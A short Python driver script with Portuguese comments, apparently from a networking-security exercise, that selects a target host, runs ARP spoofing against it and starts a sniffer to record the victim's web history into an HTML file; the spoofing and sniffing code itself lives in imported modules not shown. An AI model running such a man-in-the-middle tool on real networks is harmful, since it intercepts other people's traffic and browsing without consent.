from e1.run import select_target_host
from e2.arp import perform_arp_spoof
from e3.sniffer import sniff

def main():
    # Abre (ou cria) o arquivo "web_history.html" e o limpa
    with open("web_history.html", "w") as f:
        f.write("")

    ########## 1 ##########
    # Seleciona o host alvo da rede
    target_host = select_target_host()

    ########## 2 ##########
    # Executa o ARP spoofing contra o host alvo selecionado
    perform_arp_spoof(target_host)

    ########## 3 ##########
    # Inicia o sniffer para capturar pacotes da rede relacionados ao host alvo
    sniff(target_host)

if __name__ == '__main__':
    main()